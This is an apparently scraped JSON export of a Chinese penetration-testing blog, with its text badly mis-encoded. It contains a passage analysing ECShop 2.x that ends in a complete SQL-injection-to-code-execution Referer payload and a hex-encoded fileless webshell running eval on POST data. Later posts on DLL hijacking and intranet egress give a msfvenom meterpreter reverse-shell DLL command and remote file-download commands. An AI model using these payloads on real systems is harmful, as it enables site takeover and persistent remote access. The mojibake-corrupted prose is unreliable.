$this-&gt;_var[$tpl_var] = $value; &#125; &#125; &#125; å¯ä»¥å…¶å®æ˜¯æ³¨å†Œäº†æ¨¡æ¿å˜é‡ï¼Œç„¶åå›åˆ°loginå¤„ï¼Œè°ƒç”¨äº†displayå‡½æ•°12345678910111213141516171819202122232425function display($filename, $cache_id = '') &#123; $this-&gt;_seterror++; error_reporting(E_ALL ^ E_NOTICE); $this-&gt;_checkfile = false; $out = $this-&gt;fetch($filename, $cache_id); if (strpos($out, $this-&gt;_echash) !== false) &#123; $k = explode($this-&gt;_echash, $out); foreach ($k AS $key =&gt; $val) &#123; if (($key % 2) == 1) &#123; $k[$key] = $this-&gt;insert_mod($val); &#125; &#125; $out = implode('', $k); &#125; error_reporting($this-&gt;_errorlevel); $this-&gt;_seterror--; echo $out; &#125; filenameä¾¿æ˜¯ä¼ å…¥çš„user_passport.dwtï¼Œè¿™é‡Œè°ƒç”¨fetchå¤„ç†dwtæ–‡ä»¶ï¼Œè½¬åˆ°fetchå‡½æ•°ï¼Œä½¿ç”¨äº†1$out = $this-&gt;make_compiled($filename); ç„¶åä½¿ç”¨make_compiledå‡½æ•°è¿›è¡Œç¼–è¯‘user_passport.dwté‡Œé¢å­˜åœ¨{$back_act}å˜é‡12345&lt;td align=\"left\"&gt;&lt;input type=\"hidden\" name=\"act\" value=\"act_login\" /&gt;&lt;input type=\"hidden\" name=\"back_act\" value=\"&#123;$back_act&#125;\" /&gt;&lt;input type=\"submit\" name=\"submit\" value=\"\" class=\"us_Submit\" /&gt;&lt;/td&gt; displayå‡½æ•°é‡Œå­˜åœ¨ä¸€ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœ$outæ˜¯å¦å­˜åœ¨$this-&gt;_echashï¼Œè€Œè¿™ä¸ªhashå€¼ï¼Œå…¶å®æ˜¯ä¸€ä¸ªé™æ€å˜é‡1var $_echash = '554fcae493e564ee0dc75bdf2ebf94ca'; æˆ‘ä»¬è·Ÿè¿›è¿™ä¸ªifåˆ¤æ–­ï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œä»hashå¤„åˆ†å‰²ï¼Œç„¶åæŠŠ$käº¤ç»™$this-&gt;insert_mod($val)å»å¤„ç†ç»§ç»­è·Ÿinsert_mod()å‡½æ•°12345678function insert_mod($name) // å¤„ç†åŠ¨æ€å†…å®¹ &#123; list($fun, $para) = explode('|', $name); $para = unserialize($para); $fun = 'insert_' . $fun; return $fun($para); &#125; è¿™é‡Œå…ˆç”¨|åˆ†å‰²ï¼Œè¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œç„¶åå†ä½¿ç”¨insert_æ‹¼æ¥ï¼Œæ‰€ä»¥å…¶å®ï¼Œè¯¥å‡½æ•°åå’Œå‚æ•°å‡å¯æ§å°±æ˜¯éœ€è¦å¯»æ‰¾ä¸€ä¸ªinsert_å¼€å¤´çš„å‡½æ•°ã€‚ æœ€åï¼Œ/includes/lib_insert.phpé‡Œå­˜åœ¨ä¸€ä¸ªinsert_adså‡½æ•°12345678910111213141516171819202122232425262728293031function insert_ads($arr)&#123; static $static_res = NULL; $time = gmtime(); if (!empty($arr['num']) &amp;&amp; $arr['num'] != 1) &#123; $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \". \"AND a.position_id = '\" . $arr['id'] . \"' \" . 'ORDER BY rnd LIMIT ' . $arr['num']; $res = $GLOBALS['db']-&gt;GetAll($sql); &#125; else &#123; if ($static_res[$arr['id']] === NULL) &#123; $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '. 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND a.position_id = '\" . $arr['id'] . \"' AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \" . 'ORDER BY rnd LIMIT 1'; $static_res[$arr['id']] = $GLOBALS['db']-&gt;GetAll($sql); &#125; $res = $static_res[$arr['id']]; &#125; è¿™é‡Œæˆ‘ä»¬çš„$arræ•°ç»„ï¼Œæ˜¯å®Œå…¨å¯æ§çš„ï¼Œå°±é€ æˆäº†ä¸€ä¸ªSQLæ³¨å…¥æ¼æ´æ‰€ä»¥æ”»å‡»é“¾å°±å‡ºæ¥äº† user.php ï¼ˆè·å–$back_actï¼‰-&gt; assign() æ³¨å†Œå˜é‡ -&gt; display() è¾“å‡ºæ¨¡ç‰ˆ -&gt; æ ¹æ®hashï¼Œè¿›å…¥insert_mod() -&gt; æœ€åè°ƒç”¨insert_ads() å®Œæˆæ³¨å…¥ payload:1REFERER: hash + $fun | serialize(array(\"num\"=&gt;sqlpayload,\"id\"=&gt;1)) ä»£ç æ‰§è¡Œæ¼æ´ç‚¹åŒæ ·æ˜¯è¿™ä¸ªSQLæ³¨å…¥å¼•èµ·ï¼Œä¸»è¦æ˜¯å› ä¸ºinsert_ads()å‡½æ•°åé¢åˆå¼•å…¥äº†ä¸€ä¸ªfetch123456789$position_style = 'str:' . $position_style; $need_cache = $GLOBALS['smarty']-&gt;caching; $GLOBALS['smarty']-&gt;caching = false; $GLOBALS['smarty']-&gt;assign('ads', $ads); $val = $GLOBALS['smarty']-&gt;fetch($position_style); $GLOBALS['smarty']-&gt;caching = $need_cache; è¿™é‡Œå°†$position_styleè¿›è¡Œfetchï¼Œå¾€ä¸Šçœ‹1234567foreach ($res AS $row) &#123; if ($row['position_id'] != $arr['id']) &#123; continue; &#125; $position_style = $row['position_style']; $position_styleæ˜¯ä»SQLç»“æœé›†ä¸­å–çš„ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åº”è¯¥å¯ä»¥æ§åˆ¶ä»£ç æ‰§è¡Œç‚¹åœ¨fetchå‡½æ•°é‡Œ123456789101112function fetch($filename, $cache_id = '') &#123; if (!$this-&gt;_seterror) &#123; error_reporting(E_ALL ^ E_NOTICE); &#125; $this-&gt;_seterror++; if (strncmp($filename,'str:', 4) == 0) &#123; $out = $this-&gt;_eval($this-&gt;fetch_str(substr($filename, 4))); &#125; è¿™é‡Œä¹‹å‰å› ä¸º$position_styleå·²ç»ç»è¿‡äº†$position_style = &#39;str:&#39; . $position_style;çš„å¤„ç†æ‰€ä»¥strncmp($filename,&#39;str:&#39;, 4) == 0è‚¯å®šæ˜¯ä¸ºçœŸçš„ï¼Œæ‰€ä»¥ä¼šç›´æ¥æ‰§è¡Œä»£ç .ä½†æ˜¯éœ€è¦æ»¡è¶³fetch_strå‡½æ•°123456789101112131415161718192021function fetch_str($source) &#123; if (!defined('ECS_ADMIN')) &#123; $source = $this-&gt;smarty_prefilter_preCompile($source); &#125; $source=preg_replace(\"/([^a-zA-Z0-9_]&#123;1,1&#125;)+(copy|fputs|fopen|file_put_contents|fwrite|eval|phpinfo)+( |\\()/is\", \"\", $source); if(preg_match_all('~(&lt;\\?(?:\\w+|=)?|\\?&gt;|language\\s*=\\s*[\\\"\\']?php[\\\"\\']?)~is', $source, $sp_match)) &#123; $sp_match[1] = array_unique($sp_match[1]); for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++) &#123; $source = str_replace($sp_match[1][$curr_sp],'%%%SMARTYSP'.$curr_sp.'%%%',$source); &#125; for ($curr_sp = 0, $for_max2 = count($sp_match[1]); $curr_sp &lt; $for_max2; $curr_sp++) &#123; $source= str_replace('%%%SMARTYSP'.$curr_sp.'%%%', '&lt;?php echo \\''.str_replace(\"'\", \"\\'\", $sp_match[1][$curr_sp]).'\\'; ?&gt;'.\"\\n\", $source); &#125; &#125; return preg_replace(\"/&#123;([^\\&#125;\\&#123;\\n]*)&#125;/e\", \"\\$this-&gt;select('\\\\1');\", $source); &#125; åœ¨å¾€é‡Œé¢è·Ÿï¼Œæœ€ç»ˆæ˜¯è°ƒç”¨äº†$this-&gt;select()å‡½æ•°1234567891011121314151617181920function select($tag) &#123; $tag = stripslashes(trim($tag)); if (empty($tag)) &#123; return '&#123;&#125;'; &#125; elseif ($tag&#123;0&#125; == '*' &amp;&amp; substr($tag, -1) == '*') // æ³¨é‡Šéƒ¨åˆ† &#123; return ''; &#125; elseif ($tag&#123;0&#125; == '$') // å˜é‡ &#123;// if(strpos($tag,\"'\") || strpos($tag,\"]\"))// &#123;// return '';// &#125; return '&lt;?php echo ' . $this-&gt;get_val(substr($tag, 1)) . '; ?&gt;'; &#125; è¿™é‡Œæˆ‘ä»¬èƒ½çœ‹åˆ°æ›™å…‰äº†ï¼Œå°±æ˜¯å¦‚æœç¬¬ä¸€ä½æ˜¯$çš„è¯ï¼Œå°±è¿”å›ç»™_evalå‡½æ•°ä¸€ä¸ªå¸¦æœ‰phpæ ‡ç­¾çš„ä»£ç ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šç»è¿‡ä¸€ä¸ªget_val()1234567891011121314151617181920212223242526272829303132function get_val($val) &#123; if (strrpos($val, '[') !== false) &#123; $val = preg_replace(\"/\\[([^\\[\\]]*)\\]/eis\", \"'.'.str_replace('$','\\$','\\\\1')\", $val); &#125; if (strrpos($val, '|') !== false) &#123; $moddb = explode('|', $val); $val = array_shift($moddb); &#125; if (empty($val)) &#123; return ''; &#125; if (strpos($val, '.$') !== false) &#123; $all = explode('.$', $val); foreach ($all AS $key =&gt; $val) &#123; $all[$key] = $key == 0 ? $this-&gt;make_var($val) : '['. $this-&gt;make_var($val) . ']'; &#125; $p = implode('', $all); &#125; else &#123; $p = $this-&gt;make_var($val); &#125; å½“ä¼ å…¥çš„å˜é‡æ²¡æœ‰.$æ—¶ï¼Œè°ƒç”¨$this-&gt;make_varï¼Œçœ‹çœ‹make_var12345678910111213141516171819202122232425262728293031323334function make_var($val) &#123; if (strrpos($val, '.') === false) &#123; if (isset($this-&gt;_var[$val]) &amp;&amp; isset($this-&gt;_patchstack[$val])) &#123; $val = $this-&gt;_patchstack[$val]; &#125; $p = '$this-&gt;_var[\\'' . $val . '\\']'; &#125; else &#123; $t = explode('.', $val); $_var_name = array_shift($t); if (isset($this-&gt;_var[$_var_name]) &amp;&amp; isset($this-&gt;_patchstack[$_var_name])) &#123; $_var_name = $this-&gt;_patchstack[$_var_name]; &#125; if ($_var_name == 'smarty') &#123; $p = $this-&gt;_compile_smarty_ref($t); &#125; else &#123; $p = '$this-&gt;_var[\\'' . $_var_name . '\\']'; &#125; foreach ($t AS $val) &#123; $p.= '[\\'' . $val . '\\']'; &#125; &#125; return $p; &#125; å¯ä»¥çœ‹åˆ°æœ€ç»ˆè¿”å›çš„$på˜æˆäº†$p = &#39;$this-&gt;_var[\\&#39;&#39; . $_var_name . &#39;\\&#39;]&#39;å¾€å›çœ‹ï¼Œæˆ‘ä»¬çš„selectå‡½æ•°returnçš„å€¼å°±å˜æˆäº†1&lt;?php echo $this-&gt;_var[' $val '];?&gt; ç„¶åç»“åˆä¸Šé¢è¿›å…¥å‡½æ•°çš„æ¡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ payload1&#123;$abc'];echo phpinfo();//&#125; ç„¶åå› ä¸ºä¸æ»¡è¶³fetch_strçš„æ­£åˆ™ï¼ŒåŠ ä¸€ä¸ª/**/1&#123;$abc'];echo phpinfo/**/();//&#125; ç„¶åå°±æ˜¯åˆ©ç”¨SQLæ³¨å…¥æ¼æ´ï¼Œè®©$position_styleç­‰äºæˆ‘ä»¬çš„payloadäº† æœ€ç»ˆpayload1Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:\"num\";s:110:\"*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -\";s:2:\"id\";s:4:\"' /*\";&#125;554fcae493e564ee0dc75bdf2ebf94ca ç®€å•æ¥è¯´å°±æ˜¯åˆ©ç”¨$arr[&#39;id&#39;]å’Œ$arr[&#39;num&#39;] æ³¨é‡Šæ‰ä¸­é—´çš„ order by å’Œ limitï¼Œå¼ºåˆ¶æ‰§è¡ŒUNIONï¼Œå¸¦å…¥position_style å’Œä¹‹å‰çš„APTæ”»å‡»ä¸€æ ·ï¼Œå¯ä»¥ç›´æ¥å¸¦å…¥ä¸€ä¸ªæ— æ–‡ä»¶Webshell:1234560x7b2461275d3b617373657274286261736536345f6465636f64652827514556575155776f596d467a5a5459305832526c5932396b5a53676b58314250553152624a303576654364644b536b372729293b24615b27317d# unhex&#123;$a'];assert(base64_decode('QEVWQUwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ05veCddKSk7'));$a['1&#125;# base64_decode@EVAL(base64_decode($_POST['Nox'])); 0x04 æ€»ç»“Ecshop è¿˜æ˜¯è§çš„æ¯”è¾ƒå¤šï¼Œç”¨é€”ä¹Ÿæ¯”è¾ƒå¹¿ï¼Œç‰¹åˆ«æ˜¯ç°åœ¨å„ç±»åŒºå—é“¾çš„ç½‘ç«™ï¼Œç”¨çš„è¿˜æ˜¯æ¯”è¾ƒå¤š 3.xåŒæ ·ä¹Ÿå¯ä»¥rceï¼Œåªæ˜¯éœ€è¦ç²¾å¿ƒæ„é€ payloadï¼Œå› ä¸ºéœ€è¦ç»•è¿‡wafï¼Œä½†æ˜¯404çš„å¸ˆå‚…è¯´å…¶å®å°†union selecté€šè¿‡ä¸¤ä¸ªå‚æ•°ä¼ é€’è¿›å»ï¼Œä¸€ä¸ªå‚æ•°ä¼ é€’ä¸€ä¸ªå…³é”®å­—ï¼Œä¸­é—´çš„å¯ä»¥ä½¿ç”¨/**/æ³¨é‡Šæ‰ï¼Œè¿™æ ·å°±ä¸ä¼šè§¦å‘WAFäº†23333 0x05 Linkshttps://paper.seebug.org/695/https://xz.aliyun.com/t/2689https://www.seebug.org/vuldb/ssvid-97343","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"http://patrilic.top/categories/æ¼æ´å¤ç°/"}],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://patrilic.top/tags/ä»£ç å®¡è®¡/"}]},{"title":"DLL Hijacking","slug":"DLL Hijacking","date":"2019-08-23T04:18:04.000Z","updated":"2019-08-27T18:08:49.932Z","comments":true,"path":"2019/08/23/DLL Hijacking/","link":"","permalink":"http://patrilic.top/2019/08/23/DLL Hijacking/","excerpt":"","text":"@Authro: Patrilic@Time: 2019-08-23 12:18:04 0x00 IntroduceDLL Hijackingï¼Œ é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯DLLåŠ«æŒï¼Œåˆ©ç”¨DLLåŠ«æŒï¼Œå¯ä»¥é€šè¿‡è°ƒç”¨æ¶æ„dllæ–‡ä»¶æ¥æ‰§è¡Œshellcodeã€‚æ‰€ä»¥ï¼ŒDLLæ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç»´åŸºç™¾ç§‘ ç®€å•æ¥è¯´ï¼Œexeæ–‡ä»¶æœ¬èº«ä¸éœ€è¦å¾ˆå¤šå‡½æ•°ï¼Œè€Œæ˜¯å»è°ƒç”¨DLLæ–‡ä»¶ä¸­çš„å‡½æ•°ï¼Œå½“è¿›ç¨‹è¿è¡Œåˆ°éœ€è¦è°ƒç”¨æ—¶ï¼Œå°±å»ä»æ–‡ä»¶ä¸­è°ƒç”¨å¯¹åº”çš„å‡½æ•°ï¼Œç„¶åå½“æˆ‘ä»¬èƒ½å¤Ÿä¸­é—´æ’å…¥è‡ªå·±çš„DLLå¹¶æƒ³åŠæ³•è®©ç¨‹åºè¿è¡Œæˆ‘ä»¬çš„DLLæ—¶ï¼Œå°±é€ æˆäº†åŠ«æŒã€‚ 0x01 DLL HijackingDLL hijacking åœ¨ CWEä¸Šåˆåï¼š Untrusted Search Path Vulnerabilityhttps://cwe.mitre.org/data/definitions/426.html dllåŠ«æŒé€šè¿‡åˆ©ç”¨DLLçš„åŠ è½½é¡ºåºï¼Œè®©æˆ‘ä»¬çš„æ¶æ„dllåœ¨æ­£å¸¸çš„dllå‰é¢åŠ è½½ï¼Œå°±å¯ä»¥è¿›è¡ŒåŠ«æŒäº† DLL Search Orderä¸‹é¢æ¥çœ‹ä¸€ä¸‹dllçš„åŠ è½½é¡ºåºï¼šå®˜æ–¹æ–‡æ¡£ï¼š https://docs.microsoft.com/zh-cn/windows/win32/dlls/dynamic-link-library-search-order åº”ç”¨ç¨‹åºå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ§åˆ¶ä¸€ä¸ªDLLçš„åŠ è½½è·¯å¾„ï¼šä½¿ç”¨å…¨è·¯å¾„åŠ è½½ã€ä½¿ç”¨DLLé‡å®šå‘ã€ä½¿ç”¨manifestæ–‡ä»¶ã€‚å¦‚æœä¸Šè¿°ä¸‰ç§æ–¹å¼å‡æœªæŒ‡å®šï¼Œç³»ç»ŸæŸ¥æ‰¾DLLçš„é¡ºåºå°†æŒ‰ç…§æœ¬éƒ¨åˆ†æè¿°çš„é¡ºåºè¿›è¡Œã€‚ ç„¶åè¿™é‡Œæœ‰ä¸¤ä¸ªå‰ææ¡ä»¶ï¼Œå¯¹ä»¥ä¸‹ä¸¤ç§æƒ…å†µçš„DLLï¼Œç¨‹åºä¸ä¼šæŸ¥æ‰¾ï¼Œè€Œæ˜¯ç›´æ¥å¼•ç”¨ å¯¹äºå·²ç»åŠ è½½åˆ°å†…å­˜ä¸­çš„åŒåDLLï¼Œç³»ç»Ÿä½¿ç”¨å·²ç»åŠ è½½çš„DLLï¼Œå¹¶ä¸”å¿½ç•¥å¾…åŠ è½½DLLçš„è·¯å¾„ã€‚ï¼ˆæ³¨æ„å¯¹æŸä¸ªè¿›ç¨‹è€Œè¨€ï¼Œç³»ç»Ÿå·²ç»åŠ è½½çš„DLLä¸€å®šæ˜¯å”¯ä¸€çš„å­˜åœ¨äºæŸä¸ªç›®å½•ä¸‹ã€‚ï¼‰ å¦‚æœè¯¥DLLå­˜åœ¨äºæŸä¸ªWindowsç‰ˆæœ¬çš„å·²çŸ¥DLLåˆ—è¡¨ï¼ˆunkown DLLï¼‰ä¸­ï¼Œç³»ç»Ÿä½¿ç”¨å·²çŸ¥DLLçš„æ‹·è´ï¼ˆåŒ…æ‹¬å·²çŸ¥DLLçš„ä¾èµ–é¡¹ï¼‰ã€‚å·²çŸ¥DLLåˆ—è¡¨å¯ä»¥ä»å¦‚ä¸‹æ³¨å†Œè¡¨é¡¹çœ‹åˆ°ï¼šHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLsã€‚ 12345671.ç¨‹åºæ‰€åœ¨ç›®å½•2.ç¨‹åºåŠ è½½ç›®å½•ï¼ˆSetCurrentDirectoryï¼‰3.ç³»ç»Ÿç›®å½•å³ SYSTEM32 ç›®å½•4.16ä½ç³»ç»Ÿç›®å½•å³ SYSTEM ç›®å½•5.Windowsç›®å½•6.PATHç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½• æˆ‘ä»¬ä½¿ç”¨ProcessMonitoræ¥ç›‘æ§è¿›ç¨‹å¯ä»¥é€šè¿‡ğŸ‘‰https://docs.microsoft.com/zh-cn/sysinternals/downloads/procmonä¸‹è½½ Do itè¿™é‡Œä½¿ç”¨è‡ªåŠ¨åŒ–çš„å®¡è®¡å·¥å…·è¿›è¡ŒDLLåŠ«æŒåˆ†ææ¨èWindowsä¸‹ä½¿ç”¨Dll Hijack Auditor æˆ‘ä»¬ä»¥Vc++6.0ç¼–è¾‘å™¨ä¸ºä¾‹ ç”ŸæˆæŠ¥å‘Š æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å­˜åœ¨dllå¯ä»¥åŠ«æŒ ç„¶è€Œè¿™ä¸ªæˆ‘å‘ç°ï¼Œå¥½åƒå¹¶ä¸èƒ½ä½¿ç”¨2333é‚£è¦æ€ä¹ˆæ‰‹åŠ¨å¯»æ‰¾å‘¢ï¼Ÿåæ­£DLLçš„åŠ è½½ï¼Œæˆ‘ä»¬åªéœ€è¦ä»ç¨‹åºå·²ç»åŠ è½½çš„DLLåˆ—è¡¨ä¸­ï¼ŒæŸ¥æ‰¾åœ¨â€œKnownDLLsæ³¨å†Œè¡¨é¡¹â€ä¸­ä¸å­˜åœ¨çš„DLLã€‚ç„¶åå°†æ¶æ„dllæ”¾åœ¨ç¨‹åºå½“å‰ç›®å½•å³å¯ ç„¶åè¿˜æœ‰ä¸¤ä¸ªåˆ©å™¨ï¼š Robber https://github.com/MojtabaTajik/RobberRattler https://github.com/sensepost/rattler Hack itç”¨å€¾æ—‹å¸ˆå‚…ä¹‹å‰æ‰¾åˆ°çš„QQpinyinæ¥åšä¸€ä¸ªæ¼”ç¤ºhttps://payloads.online/archivers/2018-06-09/1 Msf1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=182.168.0.101 LPORT=10001 -f dll &gt; ntmarta.dll CobaltStrikeåŒæ ·çš„æ“ä½œï¼Œåå¼¹beacon Weixin DLL Hijackingå¾®ä¿¡PCç‰ˆç›¸ä¿¡è¿˜æ˜¯ç”¨çš„æ¯”è¾ƒå¤šçš„ï¼Œä¹Ÿå¸¸å¸¸èƒ½åœ¨ä¸€äº›å…¬å¸ç”µè„‘ä¸Šçœ‹åˆ°ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒæœ‰æ„ä¹‰çš„å½“ç„¶ï¼ŒProcessMonitorä¹Ÿèƒ½çœ‹åˆ°æ„é€ payloadåŠ«æŒå³å¯ 0x02 SummaryDLLåŠ«æŒä¹Ÿæ˜¯è€çš„ä¸è¡Œçš„ä¸€ä¸ªæ¼æ´äº†ï¼Œä½†æ˜¯åœ¨è¿›è¡Œç»´æƒï¼ŒæŒç»­æ¸—é€çš„æ–¹é¢ï¼Œä¸€ç›´éƒ½æ¯”è¾ƒå‰å®³ã€‚çœŸå®ç¯å¢ƒä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥åˆ¶ä½œä¸€ä¸ªåŠ å¯†çš„DLLæ–‡ä»¶ï¼Œä»DLLMainé‡Œè¿›è¡Œè°ƒç”¨ï¼Œå›å¼¹shellçš„åŒæ—¶ï¼Œä¹Ÿå®Œæˆç¨‹åºçš„æ­£å¸¸åŠŸèƒ½ï¼Œç‰¹åˆ«æ˜¯é’ˆå¯¹ç”¨æˆ·å¸¸ç”¨è½¯ä»¶çš„DLLåŠ«æŒï½è™šæµ®äº† 0x03 Other to Learnä¸€ç§é€šç”¨DLLåŠ«æŒæŠ€æœ¯ç ”ç©¶è€æ ‘å¼€æ–°èŠ±ï¼šDLLåŠ«æŒæ¼æ´æ–°ç©æ³•æ·±å…¥è§£æDLLåŠ«æŒæ¼æ´","categories":[{"name":"ATT&CK","slug":"ATT-CK","permalink":"http://patrilic.top/categories/ATT-CK/"}],"tags":[{"name":"DLL Hijacking","slug":"DLL-Hijacking","permalink":"http://patrilic.top/tags/DLL-Hijacking/"}]},{"title":"å¯»æ‰¾å†…ç½‘å‡ºå£ip","slug":"å¯»æ‰¾å†…ç½‘å‡ºå£ip","date":"2019-08-20T12:14:23.000Z","updated":"2019-08-26T14:45:31.535Z","comments":true,"path":"2019/08/20/å¯»æ‰¾å†…ç½‘å‡ºå£ip/","link":"","permalink":"http://patrilic.top/2019/08/20/å¯»æ‰¾å†…ç½‘å‡ºå£ip/","excerpt":"","text":"@Author: Patrilic@Time: 2019-8-20 20:14:23 0x00 å‰è¨€æ™šä¸Šåƒäº†é¥­å›é…’åº—ï¼Œä¸€è§‰ç¡é†’ï¼Œå‘ç°æœ‰ä¸ªå¸ˆå‚…é—®æˆ‘windowsæœºå™¨åªæœ‰webshellæ€ä¹ˆæ‰¾å†…ç½‘çš„å‡ºå£ipï¼Œæƒ³äº†æƒ³ç¡®å®æ²¡æ€»ç»“è¿‡è¿™ä¸ªä¸œè¥¿ï¼ˆä¸»è¦æ˜¯å¹³æ—¶éƒ½æ˜¯ç›´æ¥åå¼¹ä¸ªshelläº†..ï¼‰ ä»”ç»†æƒ³æƒ³ï¼Œå…¶å®æŒºå¥½ç©çš„ï¼Œç„¶åå°±å’Œå‡ ä¸ªå¸ˆå‚…è®¨è®ºäº†ä¸‹ï¼Œæ„Ÿè§‰å¤§æ¦‚å°±ä¸‹é¢è¿™å‡ ç§æ–¹å¼ï¼Œå¦‚æœæœ‰ä¸è¶³è¯·å¸ˆå‚…è¡¥å……ï½ 0x01 LinuxLinux ç”±äºåŸºæœ¬è‡ªå¸¦ curlå’Œwget,telnetå‘½ä»¤ï¼Œæ‰€ä»¥è¿˜æ˜¯æ¯”è¾ƒç®€å•çš„ Curl1curl cip.cc telnet1telnet cip.cc wgetåˆ©ç”¨ncç›‘å¬ç«¯å£ï¼Œç„¶ålinuxç«¯ä½¿ç”¨wgetå‘½ä»¤å³å¯ 1wget xxx.xxx.xxx.xxx:90 pingï¼ˆlinux windowsé€šç”¨ï¼‰ç»“åˆceye ç›´æ¥æ‰§è¡Œpingå‘½ä»¤ï¼Œèµ°DNS Query1ping metzl4.ceye.io 0x02 WindowsWebClientå’ŒWgetä¸€ä¸ªåŸç†ï¼Œæˆ‘ä»¬å¹³æ—¶ç»å¸¸ä¼šä½¿ç”¨ä¸‹é¢çš„è¯­å¥è¿›è¡Œæ–‡ä»¶ä¼ è¾“1(New-Object System.Net.WebClient).DownloadFile(\"http://xxx.xxx.xxx.xxx/nc.exe\",\"nc.exe\") åŒæ ·ï¼Œåªè¦æ˜¯èµ°httpé€šé“ï¼Œé‚£å°±è‚¯å®šå¯ä»¥å’Œæˆ‘ä»¬çš„vpsè¿›è¡Œè¿æ¥ï¼Œå°±å¯ä»¥æ‹¿åˆ°å‡ºç½‘ipäº† WebRequestPowershell version &gt; 3.0 å°±å¯ä»¥ä½¿ç”¨Windowsä¸Šçš„wgetäº†2333 æŸ¥çœ‹Powershellç‰ˆæœ¬ï¼š12Get-Host$PSVersionTable.PSVersion å®˜æ–¹æ–‡æ¡£ï¼šhttps://docs.microsoft.com/zh-cn/powershell/module/Microsoft.PowerShell.Utility/Invoke-WebRequest?view=powershell-5.1 Usage: certutilcertutilè¿™ä¸ªä¸œè¥¿è¢«AVç›‘æ§å¾—å¤ªæ­»äº†.. å®æˆ˜ç”¨çš„è¯ä¹Ÿéœ€è¦ä¸€å®šçš„ç»•è¿‡æŠ€å·§ startstartå‘½ä»¤ç›´æ¥ä¼šå¼€å¯ä¸€ä¸ªieè¿›ç¨‹å»è®¿é—®ç›®æ ‡url å½“ç„¶ï¼Œéœ€è¦æ³¨æ„ç”¨æˆ·ï¼Œåˆ«ç»™åˆ«äººè¿œç¨‹æ¡Œé¢å¼€ä¸ªieå•¥çš„ â€¦è¿˜æœ‰å…¶ä»–çš„å§¿åŠ¿ï¼Œåæ­£æˆ‘æˆ‘è§‰å¾—åªè¦æ˜¯å¯ä»¥ç”¨å„ç§è¥¿è¯¶å’¦è®¿é—®å¤–é¢çš„ï¼Œéƒ½å¯ä»¥æ‹¿åˆ°çœŸå®çš„å‡ºå£ipï¼Œå¤§å“¥ä»¬ä¹Ÿå¯ä»¥ç ”ç©¶ä¸‹ 0x03 åå¼¹shellæ—¢ç„¶æœ‰Webshelläº†ï¼Œæœ€å¸¸è§çš„æ–¹å¼ä¹Ÿå°±æ˜¯åå¼¹ä¸ªshellå•¥çš„ï¼Œè¿™é‡Œå°±ä¸å¤šè®²äº†ï¼Œos shell,meterpreterå•¥çš„éƒ½ok 0x04 æ€»ç»“è¿™ä¸ªé—®é¢˜ä¹Ÿæ˜¯çªå‘å¥‡æƒ³ï¼Œå¥½åƒå…·ä½“çš„æ„ä¹‰ä¹Ÿä¸æ˜¯å¾ˆå¤§ï¼Œä¸»è¦æ˜¯åœ¨æƒ³å¦‚ä½•è§„é¿AVå’Œä¸é€šè¿‡ç¬¬ä¸‰æ–¹åº”ç”¨å’Œå†™æ–‡ä»¶çš„æƒ…å†µä¸‹è¿›è¡Œä¸€ä¸ªipè·å–ï½å¸ˆå‚…ä»¬è§è°…","categories":[{"name":"Red-Team Tricks","slug":"Red-Team-Tricks","permalink":"http://patrilic.top/categories/Red-Team-Tricks/"}],"tags":[{"name":"å†…ç½‘æ¸—é€","slug":"å†…ç½‘æ¸—é€","permalink":"http://patrilic.top/tags/å†…ç½‘æ¸—é€/"}]},{"title":"CVE-2019-1162 CTFtool ææƒ","slug":"CVE-2019-1162","date":"2019-08-16T16:03:55.000Z","updated":"2019-08-20T15:29:22.659Z","comments":true,"path":"2019/08/17/CVE-2019-1162/","link":"","permalink":"http://patrilic.top/2019/08/17/CVE-2019-1162/","excerpt":"","text":"@Author: Patrilic@Time: 2019-08-17 0:03:55 0x00 å‰è¨€1a little-known protocol used on Windows to implement Text Services. This might be useful for studying Windows internals, debugging complex issues with Text Input Processors and analyzing Windows security. æ®è¯´é€šæ€xpåˆ°win10æ¥è‡ªGooleProjectZeroçš„æŠ¥å‘Šï¼šhttps://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html 0x01 ç¯å¢ƒæµ‹è¯•ç‰ˆæœ¬ï¼š Windows 10 1809 0x02 å¤ç°ä¼ 